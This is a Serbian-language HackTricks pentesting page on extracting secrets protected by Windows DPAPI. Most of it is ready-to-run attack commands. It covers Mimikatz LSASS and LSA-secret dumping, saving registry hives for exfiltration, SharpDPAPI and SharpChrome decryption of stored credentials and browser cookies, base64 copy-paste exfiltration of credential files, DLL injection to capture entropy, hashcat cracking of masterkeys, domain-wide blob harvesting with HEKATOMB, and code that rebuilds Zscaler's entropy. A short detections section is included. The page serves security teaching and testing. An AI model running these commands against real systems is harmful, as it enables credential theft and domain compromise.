# DPAPI - Extracting Passwords

{{#include ../../banners/hacktricks-training.md}}



## Šta je DPAPI

Data Protection API (DPAPI) se prvenstveno koristi u operativnom sistemu Windows za **simetrično šifrovanje asimetričnih privatnih ključeva**, pri čemu se korisničke ili sistemske tajne koriste kao značajan izvor entropije. Ovaj pristup pojednostavljuje šifrovanje za developere tako što im omogućava da šifruju podatke pomoću ključa izvedenog iz korisničkih tajni za prijavljivanje ili, u slučaju sistemskog šifrovanja, iz sistemskih tajni za autentifikaciju na domenu, čime se uklanja potreba da developeri sami upravljaju zaštitom ključa za šifrovanje.

Najčešći način korišćenja DPAPI-ja jeste putem funkcija **`CryptProtectData` i `CryptUnprotectData`**, koje aplikacijama omogućavaju da šifruju i dešifruju podatke koristeći bezbednosni kontekst trenutno prijavljenog procesa. Podrazumevano, podatke može dešifrovati samo isti korisnički ili sistemski kontekst koji ih je šifrovao.<sup>[[2]](#references)[[3]](#references)</sup>

Ove funkcije takođe prihvataju opcioni **parametar entropije** koji se koristi tokom šifrovanja i dešifrovanja. Za dešifrovanje podataka zaštićenih opcionom entropijom potrebna je ista vrednost entropije.<sup>[[2]](#references)[[6]](#references)</sup>

### Generisanje korisničkog ključa

DPAPI izvodi vrednost specifičnu za korisnika (često nazvanu **pre-key**) iz korisničkih akreditiva. Tačan način izvođenja zavisi od naloga i verzije operativnog sistema. Na primer, Impacket pokušava HMAC-SHA1 putanju zasnovanu na SHA-1 sažetku lozinke u UTF-16LE formatu, drugu zasnovanu na MD4/NT hash-u lozinke i putanju izvedenu pomoću PBKDF2-SHA256 za Protected Users. Zbog toga offline alati često mogu izvesti potreban materijal iz plaintext lozinke ili dostupnog NT hash-a.<sup>[[2]](#references)[[10]](#references)</sup>

Ovo je posebno zanimljivo zato što, ako napadač pribavi korisnički password hash, može da:

- **Dešifruje sve podatke koji su šifrovani pomoću DPAPI-ja** sa ključem tog korisnika, bez potrebe da kontaktira bilo koji API
- Pokuša da **crack-uje lozinku** offline pokušavajući da generiše validan DPAPI ključ

DPAPI održava jedan ili više **glavnih ključeva** za svakog korisnika, umesto kreiranja novog glavnog ključa za svaki zaštićeni blob. Svaki glavni ključ ima **GUID** (Globally Unique Identifier), a šifrovani blob beleži koji glavni ključ ga štiti.<sup>[[2]](#references)</sup>

Glavni ključevi se čuvaju u direktorijumu **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, gde je `{SID}` korisnikov Security Identifier. Datoteka glavnog ključa sadrži materijal zaštićen korisnikovim **pre-key** ključem i, za korisnike domena, materijal za oporavak zaštićen **rezervnim ključem domena**.<sup>[[2]](#references)</sup>

Imajte na umu da se **ključ domena koji se koristi za šifrovanje glavnog ključa nalazi na kontrolerima domena i nikada se ne menja**, pa napadač koji ima pristup kontroleru domena može da preuzme rezervni ključ domena i dešifruje glavne ključeve svih korisnika u domenu.<sup>[[2]](#references)</sup>

Šifrovani blob-ovi u svojim zaglavljima sadrže **GUID glavnog ključa** koji je korišćen za šifrovanje podataka.

> [!TIP]
> DPAPI šifrovani blob-ovi počinju sa **`01 00 00 00`**

Pronađite glavne ključeve:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Ovako izgleda gomila Master Keys jednog korisnika:

![Šta je DPAPI - generisanje korisničkih ključeva: Ovako izgleda gomila Master Keys jednog korisnika](<../../images/image (1121).png>)

### Generisanje Machine/System ključa

Ovaj ključ se koristi za mašinsko šifrovanje podataka. Zasniva se na **DPAPI_SYSTEM LSA secret**, specijalnom ključu kojem može da pristupi samo SYSTEM korisnik. Ovaj ključ se koristi za šifrovanje podataka kojima mora da može da pristupi sam sistem, kao što su mašinski credential-i ili system-wide secrets.<sup>[[2]](#references)</sup>

Imajte na umu da ovi ključevi **nemaju domain backup**, pa su dostupni samo lokalno:

- **Mimikatz** može da mu pristupi dumpovanjem LSA secrets pomoću komande: `mimikatz lsadump::secrets`
- Secret je sačuvan u registry-ju, pa administrator može da **izmeni DACL permissions kako bi mu pristupio**. Registry path je: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- Moguća je i offline ekstrakcija iz registry hives. Na primer, kao administrator na targetu, sačuvajte hives i eksfiltrirajte ih:
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
Zatim na svom analysis box-u povratite DPAPI_SYSTEM LSA secret iz hive-ova i upotrebite ga za dešifrovanje blob-ova na nivou mašine (lozinke scheduled task-ova, service credentials, Wi‑Fi profili itd.):
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
Veeam-specific DPAPI primer:

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

### Podaci zaštićeni pomoću DPAPI-ja

Lični podaci zaštićeni pomoću DPAPI-ja obuhvataju:

- Windows credentials
- Lozinke i podatke za automatsko dovršavanje u Internet Explorer-u i Google Chrome-u
- Lozinke e-mail i internih FTP naloga za aplikacije kao što su Outlook i Windows Mail
- Lozinke za deljene fascikle, resurse, wireless mreže i Windows Vault, uključujući ključeve za enkripciju
- Lozinke za remote desktop konekcije, .NET Passport i private keys za različite svrhe enkripcije i autentifikacije
- Network passwords kojima upravlja Credential Manager i lične podatke u aplikacijama koje koriste CryptProtectData, kao što su Skype, MSN messenger i druge
- Enkriptovani blob-ovi unutar registra
- ...

Podaci zaštićeni na nivou sistema obuhvataju:
- WiFi lozinke
- Lozinke scheduled task-ova
- ...

### Opcije za ekstrakciju master key-eva

- Ako korisnik ima domain admin privilegije, može da pristupi **domain backup key-u** kako bi dešifrovao sve user master key-eve u domenu:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Sa lokalnim administratorskim privilegijama moguće je **pristupiti memoriji LSASS-a** kako bi se izvukli DPAPI master ključevi svih povezanih korisnika i SYSTEM ključ.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Ako korisnik ima privilegije lokalnog administratora, može da pristupi **DPAPI_SYSTEM LSA secret** kako bi dešifrovao glavne ključeve mašine:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Ako su lozinka ili NTLM hash korisnika poznati, možete **direktno dešifrovati master ključeve korisnika**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Ako ste unutar sesije kao korisnik, moguće je zatražiti od DC-a **backup key za dešifrovanje master keys pomoću RPC-a**. Ako ste local admin, a korisnik je prijavljen, možete **ukrasti njegov session token** za ovo:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Izlistavanje Vault-a
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Pristup DPAPI-jem šifrovanim podacima

### Pronalaženje DPAPI-jem šifrovanih podataka

Datoteke koje su zaštićene za uobičajene korisnike nalaze se u:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Proverite i zamenu `\Roaming\` sa `\Local\` u navedenim putanjama.

Primeri enumeracije:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) može da pronađe DPAPI-šifrovane blobove u sistemu datoteka, registru i B64 blobovima:<sup>[[12]](#references)</sup>
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Imajte na umu da se [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (iz istog repozitorijuma) može koristiti za dešifrovanje osetljivih podataka kao što su cookies pomoću DPAPI-ja.<sup>[[12]](#references)</sup>

#### Brzi recepti za Chromium/Edge/Electron (SharpChrome)

- Trenutni korisnik, interaktivno dešifrovanje sačuvanih prijava/cookies (radi čak i sa app-bound cookies u Chrome 127+ jer se dodatni ključ razrešava iz korisnikovog Credential Manager-a prilikom pokretanja u korisničkom kontekstu):
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- Offline analiza kada imate samo fajlove. Prvo izvucite AES state key iz profila „Local State“, a zatim ga upotrebite za dešifrovanje baze podataka kolačića:
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- Analiza na nivou domena/na daljinu kada imate DPAPI rezervni ključ domena (PVK) i admin privilegije na ciljnom hostu:
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- Ako imate korisnikov DPAPI prekey/credkey (iz LSASS-a), možete preskočiti cracking lozinke i direktno dekriptovati podatke profila:
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
Beleške
- Novije verzije Chrome/Edge mogu čuvati određene cookies koristeći "App-Bound" encryption. Offline decryption tih konkretnih cookies nije moguća bez dodatnog app-bound ključa; pokrenite SharpChrome u kontekstu ciljnog korisnika da biste ga automatski preuzeli. Pogledajte Chrome security blog post naveden u nastavku.<sup>[[5]](#references)</sup>

### Ključevi za pristup i podaci

- **Use SharpDPAPI** za preuzimanje kredencijala iz DPAPI-enkriptovanih datoteka u trenutnoj sesiji:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Preuzmite informacije o kredencijalima** kao što su šifrovani podaci i guidMasterKey.<sup>[[3]](#references)</sup>
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Pristup masterkeys**:

Dekriptuј masterkey korisnika koji zahteva **domain backup key** koristeći RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
Alat **SharpDPAPI** takođe podržava sledeće argumente za dešifrovanje masterkey-a (obratite pažnju na to da je moguće koristiti `/rpc` za preuzimanje rezervnog ključa domena, `/password` za korišćenje lozinke u čistom tekstu ili `/pvk` za navođenje datoteke sa privatnim ključem DPAPI domena...):<sup>[[12]](#references)</sup>
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Dešifrovanje podataka pomoću masterkey-a**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
Alat **SharpDPAPI** takođe podržava sledeće argumente za dešifrovanje pomoću `credentials|vaults|rdg|keepass|triage|blob|ps` (obratite pažnju na to da je moguće koristiti `/rpc` za dobijanje domen backup key-a, `/password` za korišćenje plaintext password-a, `/pvk` za navođenje datoteke sa DPAPI domain private key-em, `/unprotect` za korišćenje sesije trenutnog korisnika...):<sup>[[12]](#references)</sup>
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Direktno korišćenje DPAPI prekey/credkey (lozinka nije potrebna)

Ako možete da izvršite dump LSASS-a, Mimikatz često prikazuje DPAPI ključ po prijavljivanju koji se može koristiti za dešifrovanje korisničkih masterkeys bez poznavanja lozinke u otvorenom tekstu. Prosledite ovu vrednost direktno alatima:
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- Dekriptuje neke podatke koristeći **trenutnu korisničku sesiju**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---

### Offline dešifrovanje pomoću Impacket dpapi.py

Ako imate SID i lozinku korisnika žrtve (ili NT hash), možete u potpunosti offline dešifrovati DPAPI masterkeys i Credential Manager blobs pomoću Impacket-ovog dpapi.py.<sup>[[10]](#references)[[11]](#references)</sup>

- Identifikujte artefakte na disku:
- Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
- Odgovarajući masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- Ako je alat za prenos datoteka nepouzdan, kodirajte datoteke pomoću base64 na hostu i kopirajte izlaz:
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- Dešifrujte masterkey pomoću SID-a korisnika i password/hash-a:
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- Koristi dekriptovani masterkey za dešifrovanje credential blob-a:
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
Ovaj workflow često oporavlja domain credentials sačuvane u aplikacijama koje koriste Windows Credential Manager, uključujući administratorske naloge (npr. `*_adm`).

---

### Rukovanje opcionim entropy vrednostima ("Third-party entropy")

Neke aplikacije prosleđuju dodatnu **entropy** vrednost funkciji `CryptProtectData`. Bez te vrednosti blob ne može da se dešifruje, čak i kada je poznat ispravan masterkey. Zato je pribavljanje entropy vrednosti ključno pri ciljanju credentials zaštićenih na ovaj način (npr. Microsoft Outlook, neki VPN klijenti).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) je user-mode DLL koji postavlja hook-ove na DPAPI funkcije unutar ciljnog procesa i transparentno beleži svaku prosleđenu opcionu entropy vrednost. Pokretanje alata EntropyCapture u režimu **DLL-injection** nad procesima kao što su `outlook.exe` ili `vpnclient.exe` generisaće fajl koji mapira svaki entropy buffer na pozivajući proces i blob. Uhvaćena entropy vrednost se kasnije može proslediti alatu **SharpDPAPI** (`/entropy:`) ili **Mimikatz** (`/entropy:<file>`) kako bi se podaci dešifrovali.<sup>[[6]](#references)</sup>
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Cracking masterkeys offline (Hashcat & DPAPISnoop)

Microsoft je uveo format **context 3** za masterkey počevši od Windows 10 v1607 (2016). `hashcat` v6.2.6 (decembar 2023) dodao je hash-mode **22100** (DPAPI masterkey v1 context ), **22101** (context 1) i **22102** (context 3), što omogućava cracking korisničkih lozinki direktno iz masterkey fajla uz GPU acceleration. Napadači zato mogu da sprovode word-list ili brute-force attacks bez interakcije sa ciljnim sistemom.<sup>[[7]](#references)</sup>

`DPAPISnoop` (2024) automatizuje proces:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Alat takođe može da parsira Credential i Vault blobs, da ih dešifruje pomoću cracked keys i izveze passwords u plain text formatu.<sup>[[8]](#references)</sup>


### Pristup podacima sa druge mašine

U alatima **SharpDPAPI i SharpChrome** možete navesti opciju **`/server:HOST`** da biste pristupili podacima udaljene mašine. Naravno, morate imati mogućnost pristupa toj mašini, a u sledećem primeru pretpostavlja se da je **domain backup encryption key poznat**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Ostali alati

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) je alat koji automatizuje ekstrakciju svih korisnika i računara iz LDAP direktorijuma, kao i ekstrakciju backup ključa domain controller-a putem RPC-a. Skripta zatim razrešava IP adresu svakog računara i izvršava smbclient na svim računarima kako bi preuzela sve DPAPI blobs-e svih korisnika i dešifrovala sve pomoću domain backup key-a.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Pomoću liste računara preuzete iz LDAP-a možete pronaći svaku podmrežu, čak i ako za njih niste znali!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) može automatski da dump-uje secrets zaštićene pomoću DPAPI-ja. Izdanje 2.x je uvelo:<sup>[[9]](#references)</sup>

* Paralelno prikupljanje blobs-a sa stotina hostova
* Parsiranje **context 3** masterkeys-a i automatsku integraciju sa Hashcat cracking-om
* Podršku za Chrome "App-Bound" encrypted cookies (pogledajte sledeći odeljak)
* Novi režim **`--snapshot`** za ponovljeno polling-ovanje endpointa i poređenje novokreiranih blobs-a

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) je C# parser za masterkey/credential/vault fajlove koji može da generiše Hashcat/JtR formate i opciono automatski pokrene cracking. U potpunosti podržava machine i user masterkey formate do Windows 11 24H1.<sup>[[8]](#references)</sup>


## Uobičajene detekcije

- Pristup fajlovima u `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` i drugim DPAPI-related direktorijumima.
- Naročito sa network share-a kao što su **C$** ili **ADMIN$**.
- Korišćenje alata **Mimikatz**, **SharpDPAPI** ili sličnih alata za pristup LSASS memoriji ili dump-ovanje masterkeys-a.
- Event **4662**: *An operation was performed on an object* – može se povezati sa pristupom objektu **`BCKUPKEY`**.
- Event **4673/4674** kada proces zahteva *SeTrustedCredManAccessPrivilege* (Credential Manager)

---
### Ranjivosti i promene ekosistema 2023–2025

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (novembar 2023). Napadač sa mrežnim pristupom mogao je da navede domain member da preuzme zlonamerni DPAPI backup key, čime je omogućena dekripcija user masterkeys-a. Ranjivost je zakrpljena kumulativnim update-om iz novembra 2023. Administratori treba da obezbede da su DC-jevi i radne stanice u potpunosti ažurirani.<sup>[[4]](#references)</sup>
* **Chrome 127 “App-Bound” cookie encryption** (jul 2024) zamenio je nasleđenu DPAPI-only zaštitu dodatnim ključem sačuvanim u korisničkom **Credential Manager**-u. Offline dekripcija cookies-a sada zahteva i DPAPI masterkey i **GCM-wrapped app-bound key**. SharpChrome v2.3 i DonPAPI 2.x mogu da povrate dodatni ključ kada se pokreću u user context-u.<sup>[[5]](#references)</sup>


### Studija slučaja: Zscaler Client Connector – Custom Entropy izveden iz SID-a

Zscaler Client Connector čuva nekoliko configuration fajlova u `C:\ProgramData\Zscaler` (npr. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Svaki fajl je enkriptovan pomoću **DPAPI-ja (Machine scope)**, ali vendor obezbeđuje **custom entropy** koja se *izračunava tokom izvršavanja* umesto da se čuva na disku.<sup>[[1]](#references)</sup>

Entropy se ponovo konstruiše iz dva elementa:

1. Hard-coded secret ugrađen unutar `ZSACredentialProvider.dll`.
2. **SID** Windows naloga kojem configuration pripada.

Algoritam implementiran u DLL-u ekvivalentan je sledećem:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Pošto je tajna ugrađena u DLL koji se može pročitati sa diska, **svaki lokalni napadač sa SYSTEM pravima može ponovo generisati entropiju za bilo koji SID** i dešifrovati blobove offline:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
Decryption daje kompletnu JSON konfiguraciju, uključujući svaku **proveru stanja uređaja** i njenu očekivanu vrednost – informacije koje su veoma korisne pri pokušajima client-side bypasses.

> SAVET: ostali šifrovani artefakti (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) zaštićeni su pomoću DPAPI **bez entropije** (`16` nultih bajtova). Zato se mogu direktno dešifrovati pomoću `ProtectedData.Unprotect` nakon dobijanja SYSTEM privilegija.

## References

- [1] [Synacktiv – Da li treba verovati svom zero trust-u? Zaobilaženje Zscaler provera stanja uređaja](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [2] [DPAPI Secrets. Bezbednosna analiza i oporavak podataka u DPAPI](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [3] [Čitanje DPAPI šifrovanih tajni pomoću Mimikatz-a i C++-a](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [4] [CVE-2023-36004 - Windows DPAPI (Data Protection Application Programming Interface) ranjivost spoofing-a](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [5] [Poboljšanje bezbednosti Chrome kolačića na Windows-u](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [6] [EntropyCapture: Jednostavna ekstrakcija opcione DPAPI entropije](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [7] [Beleške o izdanju hashcat v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [8] [DPAPISnoop – GitHub repozitorijum](https://github.com/Leftp/DPAPISnoop)
- [9] [DonPAPI 2.0.1 – PyPI stranica projekta](https://pypi.org/project/donpapi/2.0.0/)
- [10] [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [11] [HTB Puppy: zloupotreba AD ACL-ova, razbijanje KeePassXC Argon2 i DPAPI dešifrovanje do DC administratora](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [12] [GhostPack SharpDPAPI/SharpChrome – Upotreba i opcije](https://github.com/GhostPack/SharpDPAPI)
{{#include ../../banners/hacktricks-training.md}}
